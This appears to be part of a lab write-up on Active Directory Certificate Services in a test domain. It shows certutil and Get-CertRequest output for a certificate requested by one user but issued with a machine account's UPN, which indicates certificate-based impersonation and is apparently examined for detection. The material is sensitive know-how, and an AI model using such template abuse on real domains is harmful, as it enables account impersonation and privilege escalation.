      (CT_FLAG_ADD_OBJ_GUID -- 4)
    CT_FLAG_PUBLISH_TO_DS -- 8
    CT_FLAG_EXPORTABLE_KEY -- 10 (16)
    CT_FLAG_AUTO_ENROLLMENT -- 20 (32)
      (CT_FLAG_MACHINE_TYPE -- 40 (64))
      (CT_FLAG_IS_CA -- 80 (128))
      (CT_FLAG_ADD_DIRECTORY_PATH -- 100 (256))
    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
      (CT_FLAG_ADD_SUBJECT_DIRECTORY_PATH -- 400 (1024))
      (CT_FLAG_IS_CROSS_CA -- 800 (2048))
      (CT_FLAG_DONOTPERSISTINDB -- 1000 (4096))
    CT_FLAG_IS_DEFAULT -- 10000 (65536)
      (CT_FLAG_IS_MODIFIED -- 20000 (131072))
      (CT_FLAG_IS_DELETED -- 40000 (262144))
      (CT_FLAG_POLICY_MISMATCH -- 80000 (524288))
  Template Private Key Flags: 0x10 (16)
      (CTPRIVATEKEY_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL -- 1)
    CTPRIVATEKEY_FLAG_EXPORTABLE_KEY -- 10 (16)
      (CTPRIVATEKEY_FLAG_STRONG_KEY_PROTECTION_REQUIRED -- 20 (32))
      (CTPRIVATEKEY_FLAG_REQUIRE_ALTERNATE_SIGNATURE_ALGORITHM -- 40 (64))
      (CTPRIVATEKEY_FLAG_REQUIRE_SAME_KEY_RENEWAL -- 80 (128))
      (CTPRIVATEKEY_FLAG_USE_LEGACY_PROVIDER -- 100 (256))
      (CTPRIVATEKEY_FLAG_EK_TRUST_ON_USE -- 200 (512))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_CERT -- 400 (1024))
      (CTPRIVATEKEY_FLAG_EK_VALIDATE_KEY -- 800 (2048))
    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
      (CTPRIVATEKEY_FLAG_ATTEST_PREFERRED -- 1000 (4096))
      (CTPRIVATEKEY_FLAG_ATTEST_REQUIRED -- 2000 (8192))
      (CTPRIVATEKEY_FLAG_ATTEST_WITHOUT_POLICY -- 4000 (16384))
    TEMPLATE_SERVER_VER_NONE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 0
      (TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536))
      (TEMPLATE_SERVER_VER_2008<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 20000 (131072))
      (TEMPLATE_SERVER_VER_2008R2<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 30000 (196608))
      (TEMPLATE_SERVER_VER_WIN8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 40000 (262144))
      (TEMPLATE_SERVER_VER_WINBLUE<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 50000 (327680))
      (TEMPLATE_SERVER_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 60000 (393216))
      (V7<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 70000 (458752))
      (V8<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 80000 (524288))
      (V9<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 90000 (589824))
      (V10<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- a0000 (655360))
      (V11<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- b0000 (720896))
      (V12<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- c0000 (786432))
      (V13<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- d0000 (851968))
      (V14<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- e0000 (917504))
      (V15<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- f0000 (983040))
      (CTPRIVATEKEY_FLAG_HELLO_KSP_KEY -- 100000 (1048576))
      (CTPRIVATEKEY_FLAG_HELLO_LOGON_KEY -- 200000 (2097152))
    TEMPLATE_CLIENT_VER_NONE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 0
      (TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216))
      (TEMPLATE_CLIENT_VER_VISTA<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 2000000 (33554432))
      (TEMPLATE_CLIENT_VER_WIN7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 3000000 (50331648))
      (TEMPLATE_CLIENT_VER_WIN8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 4000000 (67108864))
      (TEMPLATE_CLIENT_VER_WINBLUE<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 5000000 (83886080))
      (TEMPLATE_CLIENT_VER_THRESHOLD<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 6000000 (100663296))
      (V7<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 7000000 (117440512))
      (V8<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 8000000 (134217728))
      (V9<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 9000000 (150994944))
      (V10<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- a000000 (167772160))
      (V11<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- b000000 (184549376))
      (V12<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- c000000 (201326592))
      (V13<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- d000000 (218103808))
      (V14<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- e000000 (234881024))
      (V15<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- f000000 (251658240))
  Serial Number: "200000005ef5f537a136632f8d00000000005e"
0000    32 00 30 00 30 00 30 00  30 00 30 00 30 00 30 00   2.0.0.0.0.0.0.0.
0010    35 00 65 00 66 00 35 00  66 00 35 00 33 00 37 00   5.e.f.5.f.5.3.7.
0020    61 00 31 00 33 00 36 00  36 00 33 00 32 00 66 00   a.1.3.6.6.3.2.f.
0030    38 00 64 00 30 00 30 00  30 00 30 00 30 00 30 00   8.d.0.0.0.0.0.0.
0040    30 00 30 00 30 00 30 00  35 00 65 00               0.0.0.0.5.e.

  Issuer Name ID: 0x0 CA Version 0.0
  Certificate Effective Date: 8/17/2025 6:00 PM GMT
  Certificate Expiration Date: 8/17/2026 6:00 PM GMT
  Issued Subject Key Identifier: "11 fc 27 17 c0 b1 52 7e 7c 25 80 48 a5 3a ef 3c a7 73 12 c2"
0000    31 00 31 00 20 00 66 00  63 00 20 00 32 00 37 00   1.1. .f.c. .2.7.
0010    20 00 31 00 37 00 20 00  63 00 30 00 20 00 62 00    .1.7. .c.0. .b.
0020    31 00 20 00 35 00 32 00  20 00 37 00 65 00 20 00   1. .5.2. .7.e. .
0030    37 00 63 00 20 00 32 00  35 00 20 00 38 00 30 00   7.c. .2.5. .8.0.
0040    20 00 34 00 38 00 20 00  61 00 35 00 20 00 33 00    .4.8. .a.5. .3.
0050    61 00 20 00 65 00 66 00  20 00 33 00 63 00 20 00   a. .e.f. .3.c. .
0060    61 00 37 00 20 00 37 00  33 00 20 00 31 00 32 00   a.7. .7.3. .1.2.
0070    20 00 63 00 32 00                                   .c.2.

  Binary Public Key:
0000    30 82 01 0a 02 82 01 01  00 bb a6 d3 50 7b 5b 30
0010    00 6f ed 4e e6 5c a3 97  e3 c7 5b 56 4e 03 97 51
0020    99 91 03 ca a1 37 72 d6  8e d8 e7 63 ea cb 73 75
0030    02 22 df 6b d7 f4 b0 a7  3f 21 e9 3b 90 fb 02 6d
0040    87 60 d4 db 25 1c ae 9e  ab 1f e1 04 0b e4 1b 31
0050    f3 f3 15 40 e0 65 d7 e7  29 95 b0 f3 5e fe 7c 11
0060    d9 68 42 52 70 f3 d0 b5  cb b9 92 a0 2f b2 36 ec
0070    43 52 9c e2 6f 83 88 73  47 51 0e a3 dc 55 70 f4
0080    f6 fa ad f6 a7 b8 0e 8f  2a fe 63 87 02 29 6d 14
0090    64 0d 76 b8 ef 37 b5 42  fb 31 bf 20 83 3d 13 7c
00a0    95 b1 9d 84 ef 8d c6 b9  65 2e 59 f6 cd a4 a6 2b
00b0    80 6e cf 50 83 40 eb 83  8f d1 30 99 7e 15 b1 f9
00c0    1f 0f 04 4c 44 59 28 51  e7 b3 d5 58 cd 6d 88 2f
00d0    bf 48 f5 75 2e 06 05 dc  59 63 94 39 5f 09 43 c4
00e0    67 f9 ec 09 28 18 14 87  63 40 e4 7c 10 87 f1 37
00f0    21 60 2f 1e 23 cc 9c 16  e2 e4 b3 78 aa 94 56 dc
0100    4b 07 36 89 6e ed 19 79  45 02 03 01 00 01

  Public Key Length: 0x800 (2048)
  Public Key Algorithm: "1.2.840.113549.1.1.1" RSA (RSA_SIGN)
0000    31 00 2e 00 32 00 2e 00  38 00 34 00 30 00 2e 00   1...2...8.4.0...
0010    31 00 31 00 33 00 35 00  34 00 39 00 2e 00 31 00   1.1.3.5.4.9...1.
0020    2e 00 31 00 2e 00 31 00                            ..1...1.

  Public Key Algorithm Parameters:
0000    05 00                                              ..

  Publish Expired Certificate in CRL: 0x0
  User Principal Name: "meereen$@essos.local"
0000    6d 00 65 00 65 00 72 00  65 00 65 00 6e 00 24 00   m.e.e.r.e.e.n.$.
0010    40 00 65 00 73 00 73 00  6f 00 73 00 2e 00 6c 00   @.e.s.s.o.s...l.
0020    6f 00 63 00 61 00 6c 00                            o.c.a.l.

  Issued Distinguished Name: "E=khal.drogo@essos.local, CN=viserys.targaryen, CN=Users, DC=essos, DC=local"
0000    45 00 3d 00 6b 00 68 00  61 00 6c 00 2e 00 64 00   E.=.k.h.a.l...d.
0010    72 00 6f 00 67 00 6f 00  40 00 65 00 73 00 73 00   r.o.g.o.@.e.s.s.
0020    6f 00 73 00 2e 00 6c 00  6f 00 63 00 61 00 6c 00   o.s...l.o.c.a.l.
0030    2c 00 20 00 43 00 4e 00  3d 00 76 00 69 00 73 00   ,. .C.N.=.v.i.s.
0040    65 00 72 00 79 00 73 00  2e 00 74 00 61 00 72 00   e.r.y.s...t.a.r.
0050    67 00 61 00 72 00 79 00  65 00 6e 00 2c 00 20 00   g.a.r.y.e.n.,. .
0060    43 00 4e 00 3d 00 55 00  73 00 65 00 72 00 73 00   C.N.=.U.s.e.r.s.
0070    2c 00 20 00 44 00 43 00  3d 00 65 00 73 00 73 00   ,. .D.C.=.e.s.s.
0080    6f 00 73 00 2c 00 20 00  44 00 43 00 3d 00 6c 00   o.s.,. .D.C.=.l.
0090    6f 00 63 00 61 00 6c 00                            o.c.a.l.

  Issued Binary Name:
0000    30 81 81 31 15 30 13 06  0a 09 92 26 89 93 f2 2c   0..1.0.....&...,
0010    64 01 19 16 05 6c 6f 63  61 6c 31 15 30 13 06 0a   d....local1.0...
0020    09 92 26 89 93 f2 2c 64  01 19 16 05 65 73 73 6f   ..&...,d....esso
0030    73 31 0e 30 0c 06 03 55  04 03 13 05 55 73 65 72   s1.0...U....User
0040    73 31 1a 30 18 06 03 55  04 03 13 11 76 69 73 65   s1.0...U....vise
0050    72 79 73 2e 74 61 72 67  61 72 79 65 6e 31 25 30   rys.targaryen1%0
0060    23 06 09 2a 86 48 86 f7  0d 01 09 01 16 16 6b 68   #..*.H........kh
0070    61 6c 2e 64 72 6f 67 6f  40 65 73 73 6f 73 2e 6c   al.drogo@essos.l
0080    6f 63 61 6c                                        ocal

  Issued Country/Region: EMPTY
  Issued Organization: EMPTY
  Issued Organization Unit: EMPTY
  Issued Common Name: "Users
viserys.targaryen"
0000    55 00 73 00 65 00 72 00  73 00 0a 00 76 00 69 00   U.s.e.r.s...v.i.
0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.

  Issued City: EMPTY
  Issued State: EMPTY
  Issued Title: EMPTY
  Issued First Name: EMPTY
  Issued Initials: EMPTY
  Issued Last Name: EMPTY
  Issued Domain Component: "local
essos"
0000    6c 00 6f 00 63 00 61 00  6c 00 0a 00 65 00 73 00   l.o.c.a.l...e.s.
0010    73 00 6f 00 73 00                                  s.o.s.

  Issued Email Address: "khal.drogo@essos.local"
0000    6b 00 68 00 61 00 6c 00  2e 00 64 00 72 00 6f 00   k.h.a.l...d.r.o.
0010    67 00 6f 00 40 00 65 00  73 00 73 00 6f 00 73 00   g.o.@.e.s.s.o.s.
0020    2e 00 6c 00 6f 00 63 00  61 00 6c 00               ..l.o.c.a.l.

  Issued Street Address: EMPTY
  Issued Unstructured Name: EMPTY
  Issued Unstructured Address: EMPTY
  Issued Device Serial Number: EMPTY

Maximum Row Index: 1

1 Rows
  38 Row Properties, Total Size = 3636, Max Size = 1619, Ave Size = 95
   0 Request Attributes, Total Size = 0, Max Size = 0, Ave Size = 0
   0 Certificate Extensions, Total Size = 0, Max Size = 0, Ave Size = 0
  38 Total Fields, Total Size = 3636, Max Size = 1619, Ave Size = 95
CertUtil: -view command completed successfully.
```
</details>

### Get-CertRequest
```
Get-CertRequest -filter 'RequestID -eq 94'


CA                                          : braavos.essos.local\ESSOS-CA
Request.ID                                  : 94
Request.RequesterName                       : ESSOS\viserys.targaryen
Request.CommonName                          : Viserys.targaryen
Request.CallerName                          : ESSOS\viserys.targaryen
Request.DistinguishedName                   : CN=Viserys.targaryen
Request.ClientInformation.MachineName       :
Request.ClientInformation.ProcessName       :
Request.ClientInformation.UserName          :
Request.SubjectAltNamesExtension            :
Request.SubjectAltNamesAttrib               :
UPN                                         : meereen$@essos.local
Issued.DistinguishedName                    : E=khal.drogo@essos.local, CN=viserys.targaryen, CN=Users, DC=essos,
                                              DC=local
Issued.CommonName                           : Users
                                              viserys.targaryen
CertificateTemplate                         : User
EnrollmentFlags                             : {CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS, CT_FLAG_AUTO_ENROLLMENT,
                                              CT_FLAG_PUBLISH_TO_DS}
SerialNumber                                : 200000005ef5f537a136632f8d00000000005e
Certificate.SAN                             : Other Name:Principal Name=meereen$@essos.local, RFC822
                                              Name=khal.drogo@essos.local
Certificate.ApplicationPolicies             :
Certificate.IssuancePolicies.PolicyName     :
Certificate.IssuancePolicies.GroupCN        :
Certificate.IssuancePolicies.GroupSID       :
Certificate.EKU                             : Encrypting File System (1.3.6.1.4.1.311.10.3.4), Secure Email
                                              (1.3.6.1.5.5.7.3.4), Client Authentication (1.3.6.1.5.5.7.3.2)
Certificate.SID_Extension.SID               : S-1-5-21-666199682-1411342147-2938717855-1114
Certificate.SID_Extension.DistinguishedName : CN=viserys.targaryen,CN=Users,DC=essos,DC=local
Certificate.SID_Extension.SamAccountName    : viserys.targaryen
Certificate.SID_Extension.UPN               : viserys.targaryen
Certificate.SID_Extension.CN                : viserys.targaryen
RequestDate                                 : 8/17/2025 6:10:54 PM
StartDate                                   : 8/17/2025 6:00:54 PM
EndDate                                     : 8/17/2026 6:00:54 PM
```